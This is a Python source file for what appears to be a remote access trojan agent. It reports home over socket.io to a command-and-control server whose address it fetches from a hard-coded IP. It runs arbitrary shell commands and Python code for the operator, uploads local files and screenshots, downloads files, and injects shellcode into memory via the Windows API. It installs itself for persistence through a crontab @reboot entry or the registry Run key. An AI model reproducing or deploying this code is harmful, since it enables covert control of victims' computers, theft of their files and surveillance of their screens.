from io import StringIO
import base64
import ctypes
import getpass
import locale
import os
import platform
import shutil
import socket
import sys
import tempfile
import traceback
import uuid
import asyncio
import zipfile

import requests
import socketio
from mss import mss

from shadow.config import settings

# Windows 使用 SelectorEventLoop,不支持子进程
# https://stackoverflow.com/questions/44633458/why-am-i-getting-notimplementederror-with-async-and-await-on-windows
if 'win32' in sys.platform:
    loop = asyncio.ProactorEventLoop()
    asyncio.set_event_loop(loop)
else:
    loop = asyncio.get_event_loop()

sio = socketio.AsyncClient()

# 判断系统编码
coding = locale.getpreferredencoding()

config_name = os.getenv('SHADOW_ENV', 'development')
config = settings[config_name]


def get_server_ip():
    if config_name != 'development':
        resp = requests.get('http://118.25.213.50:8000/ip')
        return resp.content.decode()
    else:
        return 'ws://localhost:5000'


class Agent(object):
    def __init__(self):
        self.uid = getpass.getuser() + "_" + str(uuid.getnode())
        self.platform = platform.system() + " " + platform.release()
        self.username = getpass.getuser()
        self.hostname = socket.gethostname()
        self.config = config

    # 心跳包内容
    async def hello(self):
        await sio.emit('hello', {
            # 提交id到服务端
            'id': self.uid,
            'platform': self.platform,
            'hostname': self.hostname,
            'username': self.username,
            'email': self.config.EMAIL
        }, namespace='/api')

    # 心跳包
    async def api_connect(self):
        while True:
            await self.hello()
            await asyncio.sleep(30)

    # 返回心跳包响应
    async def api_hello(self, message_body):
        print(message_body['message'])
        return message_body['message']

    # 返回命令响应
    async def api_command(self, message_body):
        print('收到来自服务端的消息：')
        print(message_body)
        room = message_body['room']
        # result_cmd = 'root# ' + message_body['cmd']
        await self.handle(message_body)

    # 命令处理器
    async def handle(self, message):
        cmd = message['cmd']
        room = message['room']
        split_cmd = cmd.split(" ")
        command = split_cmd[0]
        args = []
        if len(split_cmd) > 1:
            args = split_cmd[1:]
        try:
            if command == 'cd':
                if not args:
                    await self.send_output(room, 'usage: cd &lt;/path/to/directory&gt;')
                else:
                    self.cd(" ".join(args))
            elif command == 'upload':
                if not args:
                    await self.send_output(room, 'usage: upload &lt;localfile&gt;')
                else:
                    await self.upload(room, args[0], )
            elif command == 'download':
                if not args:
                    await self.send_output(room, 'usage: download &lt;remote_url&gt; &lt;destination&gt;')
                else:
                    if len(args) == 2:
                        await self.download(room, args[0], args[1])
                    else:
                        await self.download(room, args[0])
            elif command == 'clean':
                await self.clean(room)
            elif command == 'persist':
                await self.persist(room)
            elif command == 'exit':
                await self.exit(room)
            elif command == 'zip':
                if not args or len(args) < 2:
                    await self.send_output(room, 'usage: zip &lt;archive_name&gt; &lt;folder&gt;')
                else:
                    await self.zip(room, args[0], " ".join(args[1:]))
            elif command == 'python':
                if not args:
                    await self.send_output(room, 'usage: python &lt;python_file&gt; or python &lt;python_command&gt;')
                else:
                    await self.python(room, " ".join(args))
            elif command == 'screenshot':
                await self.screenshot(room)
            elif command == 'execshellcode':
                if not args:
                    await self.send_output(room, 'usage: execshellcode &lt;shellcode&gt;')
                else:
                    await self.execshellcode(room, args[0])
            elif command == 'help':
                await self.help(room)
            else:
                await self.run_cmd(room, cmd)
        except Exception as exc:
            await self.send_output(room, traceback.format_exc())

    def get_install_dir(self):
        install_dir = None
        if platform.system() == 'Linux':
            install_dir = self.expand_path('~/.ares')
        elif platform.system() == 'Windows':
            install_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
        if os.path.exists(install_dir):
            return install_dir
        else:
            return None

    def is_installed(self):
        return self.get_install_dir()

    def expand_path(self, path):
        """ Expand environment variables and metacharacters in a path """
        return os.path.expandvars(os.path.expanduser(path))

    # 消息发送模块
    @staticmethod
    async def send_output(room, output):
        await sio.emit('command', {
            'room': room,
            'output': output,
        }, namespace='/api')

    # cd 模块
    def cd(self, directory):
        """ Change current directory """
        os.chdir(self.expand_path(directory))

    # 截图模块
    async def screenshot(self, room):
        """ Takes a screenshot and uploads it to the server"""
        tmp_file = tempfile.NamedTemporaryFile()
        screen_shot_file = tmp_file.name + ".png"
        tmp_file.close()

        sct = mss()
        sct.shot(mon=-1, output=screen_shot_file)
        await self.upload(room, screen_shot_file)

    # 上传模块
    async def upload(self, room, file):
        """ Uploads a local file to the server """
        default_file = file
        file = self.expand_path(file)
        try:
            if os.path.exists(file) and os.path.isfile(file):
                await self.send_output(room, "[*] Uploading %s..." % file)
                filename = open(file, 'rb')
                data = filename.read()
                base64_data = base64.b64encode(data)
                await sio.emit('upload', {
                    'room': room,
                    'file': default_file,
                    'data': base64_data
                }, namespace='/api')
            else:
                await self.send_output(room, '[!] No such file: ' + file)
        except Exception as exc:
            await self.send_output(room, traceback.format_exc())

    # 下载模块
    async def download(self, room, file, destination=''):
        """ Downloads a file the the agent host through HTTP(S) """
        try:
            destination = self.expand_path(destination)
            if not destination:
                destination = file.split('/')[-1]
                print(destination)
            await self.send_output(room, "[*] Downloading %s..." % file)
            req = requests.get(file, stream=True)
            with open(destination, 'wb') as f:
                for chunk in req.iter_content(chunk_size=8000):
                    if chunk:
                        f.write(chunk)
            await self.send_output(room, "[+] File downloaded: " + destination)
        except Exception as exc:
            await self.send_output(room, traceback.format_exc())

    # 压缩模块
    async def zip(self, room, zip_name, to_zip):
        """ Zips a folder or file """
        try:
            zip_name = self.expand_path(zip_name)
            to_zip = self.expand_path(to_zip)
            if not os.path.exists(to_zip):
                await self.send_output(room, "[+] No such file or directory: %s" % to_zip)
                return
            await self.send_output(room, "[*] Creating zip archive...")
            zip_file = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
            if os.path.isdir(to_zip):
                relative_path = os.path.dirname(to_zip)
                for root, dirs, files in os.walk(to_zip):
                    for file in files:
                        zip_file.write(os.path.join(root, file), os.path.join(root, file).replace(relative_path, '', 1))
            else:
                zip_file.write(to_zip, os.path.basename(to_zip))
            zip_file.close()
            await self.send_output(room, "[+] Archive created: %s" % zip_name)
        except Exception as exc:
            await self.send_output(room, traceback.format_exc())

    async def python(self, room, command_or_file):
        """ Runs a python command or a python file and returns the output """
        new_stdout = StringIO()
        old_stdout = sys.stdout
        sys.stdout = new_stdout
        new_stderr = StringIO()
        old_stderr = sys.stderr
        sys.stderr = new_stderr
        if os.path.exists(command_or_file):
            await self.send_output(room, "[*] Running python file...")
            with open(command_or_file, 'r') as f:
                python_code = f.read()
                try:
                    exec(python_code)
                except Exception as exc:
                    await self.send_output(room, traceback.format_exc())
        else:
            await self.send_output(room, "[*] Running python command...")
            try:
                exec(command_or_file)
            except Exception as exc:
                await self.send_output(room, traceback.format_exc())
        sys.stdout = old_stdout
        sys.stderr = old_stderr
        await self.send_output(room, new_stdout.getvalue() + new_stderr.getvalue())

    # 执行命令模块
    async def run_cmd(self, room, cmd):
        print(cmd)
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, stderr = await proc.communicate()
            output = (stdout + stderr)
            if os.name == "nt":
                output = output.decode(coding)
            else:
                output = output.decode('utf-8', errors='replace')
            await self.send_output(room, output)
        except NotImplementedError as exc:
            print(exc)
            await self.send_output(room, traceback.format_exc())

    # 自启动模块
    async def persist(self, room):
        """ Installs the agent """
        if not getattr(sys, 'frozen', False):
            await self.send_output(room, '[!] Persistence only supported on compiled agents.')
            return
        if self.is_installed():
            await self.send_output(room, '[!] Agent seems to be already installed.')
            return
        if platform.system() == 'Linux':
            persist_dir = self.expand_path('~/.ares')
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
            shutil.copyfile(sys.executable, agent_path)
            os.system('chmod +x ' + agent_path)
            os.system('(crontab -l;echo @reboot ' + agent_path + ')|crontab')
        elif platform.system() == 'Windows':
            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
            shutil.copyfile(sys.executable, agent_path)
            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
            await asyncio.create_subprocess_shell(cmd, shell=True)
        else:
            await self.send_output(room, '[!] Not supported.')
            return
        await self.send_output(room, '[+] Agent installed.')

    # 暂不确定
    async def execshellcode(self, room, shellcode_str):
        """ Executes given shellcode string in memory """
        shellcode = shellcode_str.replace('\\x', '')
        shellcode = bytes.fromhex(shellcode)
        shellcode = bytearray(shellcode)
        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                  ctypes.c_int(len(shellcode)),
                                                  ctypes.c_int(0x3000),
                                                  ctypes.c_int(0x40))
        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                             buf,
                                             ctypes.c_int(len(shellcode)))
        ctypes.windll.kernel32.CreateThread(
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.c_int(ptr),
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.pointer(ctypes.c_int(0)))
        await self.send_output(room, "[+] Shellcode executed.")

    # 销毁模块
    async def clean(self, room):
        """ Uninstalls the agent """
        if platform.system() == 'Linux':
            persist_dir = self.expand_path('~/.ares')
            if os.path.exists(persist_dir):
                shutil.rmtree(persist_dir)
            os.system('crontab -l|grep -v ' + persist_dir + '|crontab')
        elif platform.system() == 'Windows':
            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares"
            await asyncio.create_subprocess_shell(cmd, shell=True)
            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v ares /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (
                persist_dir, persist_dir)
            await asyncio.create_subprocess_shell(cmd, shell=True)
        await self.send_output(room, '[+] Agent removed successfully.')

    # 帮助模块
    async def help(self, room):
        """ Displays the help """
        await self.send_output(room, self.config.HELP)

    # 退出模块
    async def exit(self, room):
        await self.send_output(room, '[+] Exiting... (bye!)')
        await asyncio.sleep(3)
        await sys.exit(0)

    # 启动模块
    async def start_server(self):

        sio.on('hello', self.api_hello, namespace='/api')
        sio.on('connect', self.api_connect, namespace='/api')
        sio.on('command', self.api_command, namespace='/api')
        while True:
            try:
                await sio.connect(get_server_ip())
                await sio.wait()
                break
            except:
                print('连接服务器失败.')
                await asyncio.sleep(3)
                continue


if __name__ == '__main__':
    agent = Agent()
    loop.run_until_complete(agent.start_server())
